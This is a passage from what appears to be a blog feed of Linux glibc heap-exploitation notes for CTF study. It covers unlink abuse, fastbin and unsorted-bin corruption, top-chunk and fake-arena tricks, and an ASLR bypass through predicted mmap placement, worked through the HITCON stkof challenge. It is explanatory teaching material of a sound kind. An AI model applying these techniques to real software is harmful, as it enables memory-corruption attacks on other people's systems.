(in list) to facilitate remova:<ol><li>Set P->fd->bk = P->bk</li><li>Set P->bk->fd = P->fd</li></ol></li></ol><h4 id="void-malloc-consolidate-master-av"><a href="#void-malloc-consolidate-master-av" class="headerlink" title="void malloc_consolidate(master av)"></a>void malloc_consolidate(master av)</h4><p>This is <font size="red">a specialized version of free()</font>.</p><blockquote><p>malloc_consolidate函数主要完成以下几个功能：</p><ol><li>首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。</li><li>malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins，再初始化fast bins。</li></ol></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Heap-Exploitation&quot;&gt;&lt;a href=&quot;#Heap-Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Heap Exploitation&quot;&gt;&lt;/a&gt;Heap Exploitation&lt;/h1&gt;&lt;h2 id=&quot;Base-Knowledge&quot;&gt;&lt;a href=&quot;#Base-Knowledge&quot; class=&quot;headerlink&quot; title=&quot;Base Knowledge&quot;&gt;&lt;/a&gt;Base Knowledge&lt;/h2&gt;&lt;h3 id=&quot;malloc-chunk&quot;&gt;&lt;a href=&quot;#malloc-chunk&quot; class=&quot;headerlink&quot; title=&quot;malloc_chunk&quot;&gt;&lt;/a&gt;malloc_chunk&lt;/h3&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;malloc_chunk&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    INTERNAL_SIZE_T        mchunk_prev_size;    &lt;span class=&quot;comment&quot;&gt;/*Size of previous chunk (if free)        */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    INTERNAL_SIZE_T        mchunk_size;         &lt;span class=&quot;comment&quot;&gt;/*Size in bytes, including overhead        */&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;malloc_chunk&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;fd&lt;/span&gt;;&lt;/span&gt;                    &lt;span class=&quot;comment&quot;&gt;/*double links  ----  used only if free.*/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;malloc_chunk&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;bf&lt;/span&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/*only used for large blocks: pointer to next larger size*/&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;malloc_chunk&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;fd_nextsize&lt;/span&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;malloc_chunk&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;bk_nextsize&lt;/span&gt;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;typedef&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;malloc_chunk&lt;/span&gt;* &lt;span class=&quot;title&quot;&gt;mchunkptr&lt;/span&gt;;&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="PWN" scheme="http://blog.flier.net.cn/categories/PWN/"/>
    
    
      <category term="PWN" scheme="http://blog.flier.net.cn/tags/PWN/"/>
    
      <category term="HEAP" scheme="http://blog.flier.net.cn/tags/HEAP/"/>
    
  </entry>
  
  <entry>
    <title>PLAY_WITH_LINUX_HEAP-notes</title>
    <link href="http://blog.flier.net.cn/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/"/>
    <id>http://blog.flier.net.cn/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/</id>
    <published>2017-10-21T03:42:24.000Z</published>
    <updated>2017-10-21T05:05:53.038Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PLAY-WITH-LINUX-HEAP"><a href="#PLAY-WITH-LINUX-HEAP" class="headerlink" title="PLAY WITH LINUX HEAP"></a>PLAY WITH LINUX HEAP</h1><p>作者:<br><strong>memeda@0ops</strong><br><strong>pwner.xu@gamil.con</strong></p><h2 id="BACKGROUND"><a href="#BACKGROUND" class="headerlink" title="BACKGROUND"></a>BACKGROUND</h2><ol><li>Linux heap become hard to exploit due to the new version of GLIBC.<ul><li>Hundreds of thousands of assertions there.</li><li>ASLR and Non-eXecutable heap.</li></ul></li><li>Heap issues are scarce in CTF games.<ul><li>spring up in recent games like HOTCON CTF &amp; Hack.LU CTF.</li></ul></li></ol><h2 id="CATALOGUE"><a href="#CATALOGUE" class="headerlink" title="CATALOGUE"></a>CATALOGUE</h2><ol><li>Introduction to GLIBC Heap</li><li>View Heap As an Attacker<ul><li>free()</li><li>malloc()</li><li>main_arena</li><li>mmap() &amp; munmap()</li></ul></li><li>Examples</li></ol><a id="more"></a><h2 id="Introduction-to-GLIBC-Heap"><a href="#Introduction-to-GLIBC-Heap" class="headerlink" title="Introduction to GLIBC Heap"></a>Introduction to GLIBC Heap</h2><h3 id="GLIBC-Heap-Structure"><a href="#GLIBC-Heap-Structure" class="headerlink" title="GLIBC Heap Structure"></a>GLIBC Heap Structure</h3><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/1.png" alt=""></p><blockquote><p>chunk头包括以下两部分：<br>prev_size: 如果当前chunk的相邻前一chunk未被使用，prev_size为此前一chunk的大小<br>size: 当前chunk的大小。由于chunk大小是8的整数倍，所以此size的后3 bit被用于存储其他信息。我们需要记住的便是最低bit，用于指示前一chunk是否已被使用(<strong> PREV_INUSE </strong>)。<br>如果当前chunk处于未被使用状态，则mem前8 bytes被用来存储其他信息，具体如下：<br>fd: 下一个未被使用的chunk的地址<br>bk: 上一个未被使用的chunk的地址<br>可以看到，chunk头中包含的大小信息，主要用来在获取内存中相邻chunk的地址（当前chunk地址减去前一chunk的大小，为前一chunk的地址；当前chunk地址加上当前chunk的大小，为后一chunk的地址）。而mem中的fd和bk只在当前chunk处于未被使用时才有意义。如果了解数据结构，便可以立刻看出，这些未被使用的chunks通过fd, bk组成了链表。事实上，malloc确实维护了一系列链表用于内存的分配和回收，这些链表被成为”bins”。<br>一般来说，每个bin链表中的chunk都有相同或将近的大小。根据bin所包含chunk的大小，可以将bin分为fastbin, unsorted bin, small bin, large bin。</p></blockquote><ul><li>the range of a chunk is between LABEL Chunk and LABEL Next Chunk</li><li>PREV_SIZE represents the size of the previous chunk(in memory) only if the previos chunk is <strong>free()’d</strong>.</li><li>SIZE represents the number of bytes between LABEL Chunk and LABEL Next Chunk. <font color="red"> <strong>If the lowest bit of SIZE is cleared as 0, then the chunk before it is not in use(free)</strong>.</font></li><li>LABEL Mem makes sense only when this chunk is <strong>malloc()’d</strong> by user. &amp;Mem is considered as the return value of <strong>malloc()</strong>.</li><li>For chunks of certain size range, there is a <strong>free list</strong> which is a linked list.</li><li>FD represents the forward pointer to the next chunk in the linked list.</li><li>BK represents the backward pointer to the previous chunk in the linked list.</li><li>The above two fields only make sense when the chunk is <strong>free()’d</strong></li><li>User’s data is stored in the region which starts at LABEL Mem. Notice that the region includes PREV_SIZE of the next chunk.</li></ul><h2 id="View-Heap-as-an-Attacker-—-free"><a href="#View-Heap-as-an-Attacker-—-free" class="headerlink" title="View Heap as an Attacker — free()"></a>View Heap as an Attacker — free()</h2><h3 id="CORRUPT-FREE-1"><a href="#CORRUPT-FREE-1" class="headerlink" title="CORRUPT FREE 1"></a>CORRUPT FREE 1</h3><ul><li>Let’s begin at function <strong>free()</strong> but not <strong>malloc()</strong>.</li><li>In the old version of GLIBC, there is a classical exploition of heap overflow with <strong>free()</strong>.</li></ul><h3 id="PROTOSTAR-HEAP-3"><a href="#PROTOSTAR-HEAP-3" class="headerlink" title="PROTOSTAR HEAP 3"></a>PROTOSTAR HEAP 3</h3><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/2.png" alt=""></p><ul><li>In old version of GLIBC malloc, there is function called unlink():</li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/3.png" alt=""></p><ul><li>If BK and FD is controlled by us, then (in Linux x86)<ul><li>*(FD + 12) = BK &amp;&amp; *(BK + 8) = FD</li><li><strong>AN ARBITRARY WRITE!</strong></li></ul></li><li>Then the problem comes, why <strong>unlink()</strong> is called when <strong>3 free()</strong>s called? Since <strong>free()</strong> means linking the chunk into the <strong>free list</strong>.</li><li><font color="red">THE ANSWER is when GLIBC free a chunk, it will go to see whether the chunk before/after is free. If it is, then <strong>the chunk before/after will be unlink()’d off its double-linked list</strong> and these two chunks merge into one chunk.</font></li><li>So for this problem, you can overflow chunk a and overwrite the <strong>heap header</strong> of chunk b.</li><li><em>If you <font color="red">set the lowest bit of SIZE of b to 0, then GLIBC fooled to consider chunk a free()’d. Then <strong>unlink()</strong> is called on chunk a</font>.</em></li></ul><blockquote><p>SIZE represents the number of bytes between LABEL Chunk and LABEL Next Chunk. <strong>If the lowest bit of SIZE is cleared as 0, then the chunk before it is not in use(free).</strong></p></blockquote><ul><li>You can also set <strong>PREV_SIZE f chunk b</strong> to fool GLIBC where the chunk b begins. Craft a fake chunk b there and get an arbitrary wirte.</li></ul><h3 id="MODERN-UNLINK"><a href="#MODERN-UNLINK" class="headerlink" title="MODERN UNLINK"></a>MODERN UNLINK</h3><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/4.png" alt=""></p><p><strong>New checking: FD-&gt;bk \== P &amp;&amp; BK-&gt;fd \== P</strong></p><h3 id="CORRUPT-FREE-2"><a href="#CORRUPT-FREE-2" class="headerlink" title="CORRUPT FREE 2"></a>CORRUPT FREE 2</h3><ul><li>Let us have a look at Problem stkof from HITCON CTF 2014.</li><li>Pwnable worth 550 points. It is still available on httpL//ctf2014.hitcon.org/dashboard.html.</li><li>The scenario is simple:<ul><li>You can give a size and malloc a chunk of the size.</li><li>There is global arrary which records the pointer of every chunk you malloc()’d.</li><li>You can write arbitrary long content into the pointer in the global array.</li><li>You can free any of the chunk you malloc()’d before.</li><li>There is a global variable record the times you malloc()’d.</li></ul></li></ul><h3 id="PWNABLE-PROBLEM-STKOF"><a href="#PWNABLE-PROBLEM-STKOF" class="headerlink" title="PWNABLE PROBLEM STKOF"></a>PWNABLE PROBLEM STKOF</h3><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/5.png" alt=""></p><p>In this scenario, there is a variable counting how much chunk you’ve malloc()’d. Here it is 3 at 0x602100.</p><ul><li>3 chunk’s pointer are stored in a global arrary at 0x602140, which is 0xe05010, 0xe05040 and 0xe050d0(Remember is is what we called LABEL Mem).</li><li>We can also writing anything long into the data area these pointers pointing to.</li></ul><h3 id="CORRUPT-FREE-2-1"><a href="#CORRUPT-FREE-2-1" class="headerlink" title="CORRUPT FREE 2"></a>CORRUPT FREE 2</h3><ul><li>Heap Overflow with free()’ called, everything is nice except that<ul><li>FD-&gt;bk ?= P</li><li>BK-&gt;fd ?= P</li></ul></li><li>When facing this, the MOST IMPORTANT thing is that <font color="red"><strong>find somewhere in the memory in which the value is P</strong></font>.</li></ul><blockquote><p>PS: Geohot’s futex exploit trick(0x00bf0000) to bypass plist checking in <em>Android Kernel</em>.</p></blockquote><ul><li>In this problem, there is a global arrary which stores all the pointer pointing to all the chunk. Notice that this pointer is pointing to LABEL &amp;Mem but not that start of the chunk!</li><li>So we need to craft a fake chunk at &amp;Mem. That is not very difficult because we have heap overflow whcih means the whole control of the content of the chunk on the heap.</li><li>Another restriction shown in the code before is the <em>if</em> clause.<ul><li>Just set P-&gt;fd_nextsize to NULL then skip if.</li></ul></li><li>EXP from acez@Shellphish</li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/6.png" alt=""></p><p><a href="http://" target="_blank" rel="external">http://github.com/acama/ctf-writeups/blob/master/hitcon2014/stkof/x.py</a></p><ul><li>As you can see, the exploit overwrite chunk 3, place a fake chunk at the location of chunk 4.</li><li>The fake heap header of chunk 4 fool GLIBC to believe that chunk before chunk 4 is chunk 2.</li><li>There is a fake chunk 2 at chunk 2’Mem. Notice that 0x602150 is the pointer in the global array which pointing to chunk 2’s Mem(<strong>key point here to bypass the chunk!</strong>).</li><li><font color="red">Call free(4) to unlink fake chunk2. Then after unlink, an address in the range of &amp;global_arrary itself is written into the global arrary. That means we can rewrite the content of the global arrary directly.</font></li><li>If we control the global array, then wen can control which pointer we can write into.</li><li>This is a case about heap overflow where <strong>SPECIFIC WRITE</strong> turns into <strong>ARBITRARY WRITE</strong>！</li></ul><h3 id="Always-keep-in-mind"><a href="#Always-keep-in-mind" class="headerlink" title=" Always keep in mind "></a><font color="red"> Always keep in mind </font></h3><ul><li>When malloc() returns, it gives you the pointer pointing to LABEL Mem.</li><li>When processing some stuff in malloc.c, the pointer of a chunk(whose type is <font color="red"><strong>struct malloc_chunk * </strong></font>) is pointing to LABEL Chunk.</li></ul><h3 id="POISINED-NULL-BYTE"><a href="#POISINED-NULL-BYTE" class="headerlink" title="POISINED NULL BYTE"></a>POISINED NULL BYTE</h3><ul><li>In August Zero released a post about a GLIBC NULL byte off-by-one exploitation.</li><li>The null byte will clear all the status bits of the SIZE of the next chunk.<ul><li>The <font color="red">PREV_SIZE </font>is actually the user data of the chunk but now it will used to locate the chunk</li></ul></li><li>The exploit decribed in the post is a local unprivilrge exploit with Linux 32bit, which means we could half-disable ASLR and things become easy.</li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/23247812.png" alt=""></p><p>The exploit regerred in the post used <font color="red">fd\nextsize</font> and <font color="red">bk-nextsize</font> to do the arbitrary write which is also a way besides directly use <font color="red">fd</font> and <font color="red">bk</font>.</p><ol><li><font color="red">P-&gt;fd_nextsize</font> should not be NULL.</li><li><font color="red">FD-&gt;fd_nextsize</font> should not be NULL.</li></ol><p>However, the target in the post is Fedora where that two aserts do not exist. When it comes to Ubuntu, Fail.</p><h2 id="View-Heap-as-an-Attacker-—-malloc"><a href="#View-Heap-as-an-Attacker-—-malloc" class="headerlink" title="View Heap as an Attacker — malloc()"></a>View Heap as an Attacker — malloc()</h2><h3 id="CHEAT-MALLOC-1"><a href="#CHEAT-MALLOC-1" class="headerlink" title="CHEAT MALLOC 1"></a>CHEAT MALLOC 1</h3><ul><li>free()’d chunks which has a size in certain range will be put into one free list.</li><li>The head of the free list is in main_arena which will be covered later.</li><li>The basic idea of the section is to <font color="red">CHEAT</font> GLIBC to malloc the chunk to the special place you want to. Then you can write to that heap chunk, which means that you write to that special place.</li><li>If there are some important pointers or data structures at that special place, then it is easy to finish the exploit then.</li></ul><h4 id="begin-with-an-easy-example-–-fastbin"><a href="#begin-with-an-easy-example-–-fastbin" class="headerlink" title="begin with an easy example – fastbin"></a>begin with an easy example – fastbin</h4><ul><li>When the chunk’s size is small enough, GLIBC called it fastbin.</li><li>Different sizes of fastbins also have their free list, but this time it is a <font color="red">single-linked list</font>.</li><li>The single-linked list makes things much easier.</li></ul><p>This picture shows two fastbins in the free list which both have a size of 0x30.<img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/24518812.png" alt=""></p><p>Single-linked list header 0x7fff7bd1770 pointing to Chunk 0x00e05090.<br>Chunk 0x00e05090’s FD pointing to Chunk 0x00e05030.<br>Chunk 0x00e05030’s FD is NULL, the end of this linked list.</p><h4 id="How-does-GLIBC-work-when-malloc-ing-a-fastbin"><a href="#How-does-GLIBC-work-when-malloc-ing-a-fastbin" class="headerlink" title="How does GLIBC work when malloc()ing a fastbin?"></a>How does GLIBC work when malloc()ing a fastbin?</h4><ul><li>It just mainly pick out <font color="red">the first</font> (-&gt;fd) fastbin in the linked list, and return it to the user.</li><li><p>That meas if we <font color="red">control just one node of this linked list</font>, then we can cheat GLIBC to malloc the chunk where specified by us.</p></li><li><p>maclloc two fastbins.</p><ol><li>Free the 2nd fastbin.</li><li>Overflow the 1st fastbin to change 2nd fastbin’s FD to our specified value.</li><li>Malloc one time. GLIBC return the 2nd fastbin to us, meanwhile the header of the single-linked list points to our specified value. The value points to a fake fastbin entry we crafted already.</li><li>Malloc anather time.</li><li>Then just write into the new chunk which birth at the specified place you want to and finish your exploit.</li></ol></li><li><p>EASY to exploit since single-linked list is less troublesome, comparing with double-linked list with countless security check with normal bins in the new version of GLIBC malloc.c.</p></li><li><p>The only check for the fastbin entr in the list is the <font color="red">SIZE</font>! Craft a proper size for the fake fastbin entry.</p><ul><li>Recall the problem STKOF, where the fakebin could be?</li><li>There is a counting variable at 0x602100, just add it up to a proper value and it somehow could pretend to be <font color="red">SIZE</font> right?(the fake chunk at 0x602100 - 0x8)</li></ul></li><li><p>If you can free any where you want, then just free the place you could write(craft) directly. You don’t necessarily need to work on the heap and do the overflow.</p></li><li>Or if you can overwrite the malloc()’d pointer to a specia=fy value and then free it, also take the same effect.<ul><li>This scenario is mentioned in phrack Malloc_Des-Maleficarum.</li></ul></li></ul><h3 id="CHEAT-MALLOC-2"><a href="#CHEAT-MALLOC-2" class="headerlink" title="CHEAT MALLOC 2"></a>CHEAT MALLOC 2</h3><h4 id="Whether-malloc-with-normal-bins-and-double-linked-can-be-cheated"><a href="#Whether-malloc-with-normal-bins-and-double-linked-can-be-cheated" class="headerlink" title="Whether malloc() with normal bins and double-linked can be cheated"></a>Whether malloc() with normal bins and double-linked can be cheated</h4><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/26908750.png" alt=""></p><p>I malloc 7 chunks with normal size and free 3 of them. As you can see, they are both in one double-linked list.</p><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/26971281.png" alt=""></p><p>Then I do malloc(0x212).</p><ul><li>As you can see, strange things happen. Now two double-linked lists there.</li><li>In fact, double-linked list(0x7ffff7bd17b8) is called the <font color="red">unsorted bin’s free list</font>.</li><li><p>double-linked list(0x7ffff7bd19b8) is the real list for the real free list for the chunk with size 0x210.</p></li><li><p>At first, all the free()’d chunks are put in to unsorted bin list.</p></li><li>When alloc() comes, GLIBC travels from the BK of the header of the unsortd bin list.<ul><li>If the size is fit, then unlink this chunk and return to the user.</li><li>If not, put this chunk into its free list according to its size.</li></ul></li><li>I am going to give an illustration about exploiting this.</li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/27513921.png" alt=""></p><p>Overflow Chunk 0xe05210 to change 0xe05630’s BK to an address which points to a craft heap chunk. The chunk has a right SIZE(0x211).]</p><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/28013312.png" alt=""></p><p>As you can see, after I malloc(0x212), the header of the unsort bin list’s BK points to my fake chunk at 0xe10000.</p><ul><li>A very important thing is that during the process shown before, there is <font color="red">NO CHECKING like P-&gt;FD-&gt;BK == P AND so on</font>.</li><li>And after this, you are able to cheat GLIBC to malloc at the place you want(int this case 0xe10000). But during this, Chunk 0xe10000 will be unlinked so make sure its BK-&gt;FD points to 0xe10000 this time.</li><li>For this case, I just bring out my ideas. Let me know if you have other nice ways to exploit it.</li></ul><h3 id="CHEAT-MALLOC-3"><a href="#CHEAT-MALLOC-3" class="headerlink" title="CHEAT MALLOC 3"></a>CHEAT MALLOC 3</h3><ul><li>There is another important concept called <font color="red"> <strong> wilderness </strong></font>or the <font color="red">top</font> chunk.</li><li>In a word, if there is no proper chunk in the free list, then GLIBC will splice a certain size out of the top chunk and then return it to ther user.</li><li><p>That means the top chunk usually has a large <font color="red">SIZE</font> and be located at the bottom of the heap (behind all the normal heao chunks).</p></li><li><p>Malloc_DES-Maleficarum also described a trick which cheats malloc by using <font color="red">the top chunk</font>.</p><ol><li>You can use overflow to change the <font color="red">SIZE</font> of the top chunk to 0xffffffff(Linux x86).</li><li>Then you just malloc, and if the control flow goes into <font color="red">use_top</font>, then actually you can malloc whatever large size you want.</li><li>You can craft a special size <font color="red">s</font>. Then after malloc()ing, the top chunk’s address will change to the original address plus <font color="red">s</font>. In fact, we can specify any new address we want by specifying <font color="red">s</font>.</li><li>If we malloc again, then we could get a chunk at the special place we want.</li></ol></li><li>This trick may not make sense when meet <font color="red">ASLR</font> since at most time the location of the top chunk cannot be predicted.</li></ul><h2 id="View-Heap-as-an-Attacker-—-main-arena-predict-heap-chunk’s-location-despite-ASLR"><a href="#View-Heap-as-an-Attacker-—-main-arena-predict-heap-chunk’s-location-despite-ASLR" class="headerlink" title="View Heap as an Attacker — main_arena / predict heap chunk’s location despite ASLR"></a>View Heap as an Attacker — main_arena / predict heap chunk’s location despite ASLR</h2><h3 id="MAIN-ARENA"><a href="#MAIN-ARENA" class="headerlink" title="MAIN_ARENA"></a>MAIN_ARENA</h3><ul><li>It’s time for us back to the most basic and important structure <font color="red"><strong>main_arena</strong></font>.</li><li><p>Hack the <font color="red"><strong>core</strong></font> then we control all.</p></li><li><p>main_arena is defined as below(Linux x86_64)</p></li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/2992875.png" alt=""></p><ul><li><p>It is a structure of type malloc_state and size is 0x888.</p></li><li><p>Array fastbinY</p><ul><li>The Value in each entry represents the head of (single-linked) free list of the fastbins whcih has a size in certain range.</li></ul></li><li>Top<ul><li>It is the top-most chunk. When there is no good target chunk for a new malloc request in these free lists, it is used.(label use_top in function _int_malloc)</li></ul></li><li>Array bins<ul><li>Heads of all the (double-linked) free list of different size ranges.</li></ul></li><li>next<br>   Pointing to the next arena.</li><li>system_mem<br>  Memory allocated from the system in this arena.</li></ul><h4 id="FAKE-MAIN-ARENA"><a href="#FAKE-MAIN-ARENA" class="headerlink" title="FAKE MAIN_ARENA"></a>FAKE MAIN_ARENA</h4><ul><li>A <font color="red">POINTER</font> pointing to arena structure is near <font color="red">TLS</font>.<ul><li>How to use heap overflow to rewrite it? I’ll talk about it later.</li></ul></li><li><p>Now, let us have a discussion on how to do an exploitation when we could specify the arena which we can fully controlled.</p></li><li><p>The main idea is to specify the head of the linked list in the arena, and then cheat GLIBC to malloc a new chunk at that specified place we prefer.</p></li><li>But thing are not very easy. The specified place(the fake chunk) must satisfy many conditions, otherwise <em>malloc</em> will go to failure.</li></ul><h4 id="FIGHTING-WITH-ASSERTIONS"><a href="#FIGHTING-WITH-ASSERTIONS" class="headerlink" title="FIGHTING WITH ASSERTIONS"></a>FIGHTING WITH ASSERTIONS</h4><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/49546531.png" alt=""></p><ul><li>Let us trace back the source.</li><li>Before <em>_libc_malloc</em> exit, there is an assert on victim, the chunk which is going to return to you.<ol><li>If victim == NULL, just don’t care this</li><li>If the chunk is labelled <em>mmapped</em><ul><li>a chunk is mmapped when its <strong>SIZE</strong> has 0x2 bit set.</li></ul></li><li>If ar_ptr == victim’s arena ptr<ul><li>Due to the faked arena we crafted, chunk_non_main_arena will return true.<ul><li>If the <font color="red">SIZE</font> has 0x4 bit set, it means NON_MAIN_ARENA.</li></ul></li><li>And it is very hard to control the value which address <em>(ptr &amp; ~(HEAP_MAX_SIZE - 1))</em> pointing to.<ul><li>It is very hard to control on Linux x86_64. If ptr is not big enough, it will cause NULL pointer dereference.</li></ul></li></ul></li></ol><ul><li>So in a word, the best choice is to satisfy <font color="red">[2]</font> and then bypass this assert.<br><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/49736265.png" alt=""></li></ul></li></ul><blockquote><p>BTW</p><ul><li>Actually when we call free(p), it weill call arena_for_chunk(p) to get the arena of the chunk.</li><li>What if we use heap overflow to set a chunk’s NON_MAIN_ARENA bit?<ul><li>it will then try (ptr &amp; ~(HEAP_MAX_SIZE - 1))-&gt;ar_ptr to get the arena pointer…</li><li>That may cause problems, which is mentioned in phrack Malloc_Des-Maleficarum.</li></ul></li></ul></blockquote><ul><li>To satisfy <font color="red">[2]</font>, you faked chunk’s <font color="red">SIZE</font> should have 0x2 bit (<em>mmapped</em>).</li><li>If you deep into _int_malloc, you will find out that sometimes before it return p; to exit, it will finally <font color="red">reset the head of the chunk</font> which it will then return to you, which means you’ll lose the 0x2 bit.</li><li><p>We do not hope that happeds.</p></li><li><p><font color="red">3 scenarios where the head of our crafted chunk wont’t be reset</font></p><ul><li>fastbin size range;</li><li>corresponding small bin’s free list is not empty;</li><li>a free()’d candidate chunk in unsort bin free list and the size of free()’d candidate chunk in the free list is exactly the same as our crafted chunk’s size.</li></ul></li><li><p>Again,<font color="red">fastbin</font> becomes our first choice, since we must deal witg FD and BK when use whether normal small bin or normal large bin.</p></li><li>[1] A crafted chunk you want to malloc on which has a proper <font color="red">SIZE</font>(0x2 bit set).<ul><li>Remember an non-NULL illegal FD of this chunk will not make a crash during this malloc() but will bring a side effect in the furture.</li><li>[2] The entry of fastbinY’s free list should be set to the address of your crafted chunk.(&amp;<font color="red">SIZE</font> - 0x8 on Linux x86_64).</li></ul></li></ul><h4 id="A-FAKE-ARENA-EXAMPLE"><a href="#A-FAKE-ARENA-EXAMPLE" class="headerlink" title="A FAKE ARENA EXAMPLE"></a>A FAKE ARENA EXAMPLE</h4><p>you do not need to specify the whole 0x888 bytes. For example, if you use fast bin to exploit, you may must specify the first several bytes.</p><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/35814781.png" alt=""></p><h3 id="DEFEAT-ASLR"><a href="#DEFEAT-ASLR" class="headerlink" title="DEFEAT ASLR"></a>DEFEAT ASLR</h3><ul><li>Where is the problem of main_arena? How could we touch it?</li><li>If the size you want to malloc is not less than 128KB, then GLIBC may use <em>mmap()</em> to allocate a new area for you.</li><li>There are many gaps in the program’s VM map, and GLIBC will use these large gaps to satisfy your malloc request.</li></ul><p>main_arena is in the marked area(TLS is there), and if we can malloc a chunk before this arena nad overflow it, then we can overwrite main_arena.</p><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/1148359.png" alt=""></p><ul><li>Although the existence of ASLR, I would like to say that it is possible to know it is possible to know it is the time I malloc()’d just before TLS.</li><li><p>In fact, the location of the chunk you malloc()’d could be predicted even on Linux x86_64.</p></li><li><p>Consider a program(stkof) which doesn’t have any chunk malloc90d before the user’s input comes.</p></li><li>[1] Then I try to malloc(2147483648) as many times as possible.</li><li>[2] And then I malloc(135168).<em>The chunk will be located just before TLS. I will fill it with As to give an illustration.</em></li><li>Note that all the malloc()s in [1] &amp; [2] will actually call <em>mmap()</em>.</li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/922812.png" alt=""></p><p>The chunk just before arena is located at 0x7f0313248010. And with no surprise, the pointer of arena is at 0x7f031326a700. So, it is able to overflow it for sure. Btw, the stack canary is at 0x7f031326a768.</p><ul><li>Before the pointer of the arena, there are some values.</li><li>Actually most of these values can just be overwritten to 0x0 except the first entry(which is located at 0x7f031326a690 in the previous picture).<ul><li>Its symbol is _nl_global_lacale.</li><li>And is used in ____strtoll_I_internal.</li></ul></li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/1327031.png" alt=""></p><p>We should put an accessible pointer for a fake _nl_global_locale. And think it as %r8, make sure that these will not cause a segmentation fault:</p><ul><li>mov 0x8(%r8), % rax</li><li>mov 0x68(%r8), %r15</li><li>testb $0x20, 0x1 (%r15, %rax, 2)<ul><li>Here %rax usually range from ord(‘0’) to ord(‘9’)</li></ul></li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/1576000.png" alt=""></p><ul><li>OK! Now just replace the pointer of the <strong>arena</strong> with an address which a fake arena structure is located at there.</li><li>BUT! Due to ASLR, you may not know the exact address of your fake arena structure……</li></ul><p><img src="/2017/10/21/PLAY-WITH-LINUX-HEAP-notes/2574921.png" alt=""></p><p>Actually there are two gaps and the location of the two gaps are easy to predicted.</p><ul><li>When I malloc() for hundreds of thousands of times, the 